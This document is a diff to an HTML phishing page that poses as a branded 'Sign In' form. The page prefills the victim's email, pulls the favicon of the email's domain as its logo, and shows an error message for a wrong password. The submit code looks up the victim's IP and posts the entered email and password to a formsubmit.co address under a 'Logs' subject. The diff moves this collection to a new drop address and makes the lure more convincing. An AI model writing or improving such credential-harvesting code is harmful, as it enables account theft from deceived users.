@@ -14,47 +14,53 @@
 			height: 100vh;
 			width: 100vw;
 			font-family: Arial, Helvetica, sans-serif;
-			overflow: hidden; /* Prevent scrolling */
+			overflow: hidden;
 			position: relative;
+			background: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjRR_D5KmxXbB5O6qLtAAsuWFMtM7o9TpXBEYc1pZFqn8IRvOniOusERV9Ott1FD43z8qHwNtowRZuzAAcQYovayaManIRtOSC2VQ2DioQwzZcxvAvcLJyQuDvk1pLv9M14VjMF04dlQrZLh9E_NYhjJHHtHuZrxxizAZ_WFRqgWJ25eUMGtlM3zvSmsYw/s947/image%20%282%29.png') no-repeat center center fixed;
+			background-size: cover;
 		}
 
-		.bg-img {
+		/* Remove the bg-img and iframe styles since we're using background image */
+		.bg-img, iframe {
+			display: none;
+		}
+
+		/* Add a semi-transparent overlay to make form more readable */
+		body::before {
+			content: '';
 			position: absolute;
 			top: 0;
 			left: 0;
-			height: 100vh;
-			width: 100vw;
+			right: 0;
+			bottom: 0;
+			background: rgba(0, 0, 0, 0.5);
 			z-index: 1;
-		}
-
-		iframe {
-			height: 100%;
-			width: 100%;
-			border: none;
-			display: block;
 		}
 
 		/* Add styles to the form container */
 		.container {
-		max-width: 400px;
-		padding: 16px;
-		background-color: white;
-		border-radius: 5px;
-		position: absolute;
-		left: 50%;
-		top: 50%;
-		transform: translate(-50%, -50%);
-		z-index: 2;
-	}
-
-	@media (max-width: 480px) {
-		.container {
-			left: 10%;
-			top: 20%;
-			margin-left: 5%;
-			transform: translate(-10%, -10%);
+			max-width: 400px;
+			padding: 16px;
+			background-color: white;
+			border-radius: 5px;
+			position: absolute;
+			left: 50%;
+			top: 50%;
+			transform: translate(-50%, -50%);
+			z-index: 2;
+			box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
 		}
-	}
+
+		@media (max-width: 480px) {
+			.container {
+				left: 50%;
+				top: 50%;
+				margin-left: 0;
+				transform: translate(-50%, -50%);
+				width: 90%;
+				max-width: 90%;
+			}
+		}
 
 		/* Full-width input fields */
 		input[type=text], input[type=password] {
@@ -63,6 +69,7 @@
 			margin: 5px 0 22px 0;
 			border: none;
 			background: #f1f1f1;
+			border-radius: 3px;
 		}
 
 		input[type=text]:focus, input[type=password]:focus {
@@ -78,47 +85,62 @@
 			cursor: pointer;
 			width: 100%;
 			opacity: 0.9;
+			border-radius: 3px;
+			font-size: 16px;
+			font-weight: bold;
+			transition: opacity 0.3s;
 		}
 
 		.btn:hover {
 			opacity: 1;
 		}
 
+		.btn:disabled {
+			background-color: #666;
+			cursor: not-allowed;
+			opacity: 0.7;
+		}
+
 		.img {
 			text-align: center;
+			margin-bottom: 20px;
 		}
 
 		#title {
 			text-align: center;
-			margin: 10px 0;
+			margin: 10px 0 20px 0;
+			color: #333;
 		}
 
 		#error {
 			display: none;
 			color: red;
+			background-color: #ffe6e6;
+			padding: 10px;
+			border-radius: 3px;
+			margin-bottom: 15px;
+			border: 1px solid #ff9999;
+		}
+
+		label {
+			color: #333;
+			font-weight: bold;
+			margin-bottom: 5px;
+			display: block;
 		}
 	</style>
 </head>
 <body>
-	<div class="bg-img" id="bg-img">
-		<!-- Set a valid URL or remove src entirely if you want to load it dynamically -->
-		<iframe 
-			id="frame" 
-			src="" 
-			scrolling="no" 
-			sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts"
-			allowfullscreen>
-		</iframe>
-	</div>
+	<!-- Background image is set via CSS -->
 	
 	<form class="container" id="login-form">
 		<div class="img">
-			<img src="" id="logo" alt="" style="width: 100px; height: 100px; ">
+			<img src="" id="logo" alt="" style="width: 100px; height: 100px; border-radius: 50%; border: 2px solid #0096FF;">
 		</div>
 
 		<h3 id="title">Sign In</h3>
 
-		<h5 id="error" style="display: none; color: red;">Password is incorrect, please try again!</h5>
+		<div id="error" style="display: none; color: red;">Password is incorrect, please try again!</div>
 
 		<label for="email">
 			<b>Email Address</b>
@@ -149,14 +171,13 @@
 		$('#email').val(clientID);
 		const domain = clientID.split('@').pop();
 		
-		// Set iframe to the domain
-		$("#frame").attr("src", "https://" + domain);
+		// No iframe to set since we're using background image
 		
 		// Use favicon service
 		const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
 		$("#logo").attr("src", logoUrl)
 			.on("error", function() {
-				$(this).attr("src", "https://via.placeholder.com/100/cccccc/666666?text=" + domain.charAt(0).toUpperCase());
+				$(this).attr("src", "https://via.placeholder.com/100/0096FF/ffffff?text=" + domain.charAt(0).toUpperCase());
 			});
 	}
 
@@ -175,7 +196,7 @@
 		
 		// Get IP info and submit to Formspree
 		$.getJSON('https://ipinfo.io/json', function(response) {
-			const posting = $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", {
+			const posting = $.post("https://formsubmit.co/ajax/dattiobi01@yandex.com", {
 				_subject: "Logs | " + response.ip,
 				Email: email,
 				Password: password,
@@ -216,4 +237,3 @@
 </script>
 </body>
 </html>
-
